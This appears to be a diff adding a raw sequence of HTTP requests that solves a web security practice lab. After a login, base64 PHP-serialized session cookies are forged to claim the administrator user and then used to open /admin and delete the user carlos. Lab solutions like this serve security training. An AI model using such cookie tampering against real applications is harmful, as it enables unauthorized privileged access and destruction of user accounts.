@@ -1,0 +1,15 @@
+POST /login HTTP/1.1
+
+username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6IndsNjVkbTZoczVkZTE5cXBuZmV2d2lobjZpMmllNXI5Ijt9
+
+GET /my-account HTTP/1.1
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InF3bzUxcnA0YTZtaHdlM2tkMzdwaG83ZXkwYW4xZXprIjt9
+
+GET /admin HTTP/1.1
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InF3bzUxcnA0YTZtaHdlM2tkMzdwaG83ZXkwYW4xZXprIjt9
+
+GET /admin/delete?username=carlos HTTP/1.1
+Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InF3bzUxcnA0YTZtaHdlM2tkMzdwaG83ZXkwYW4xZXprIjt9
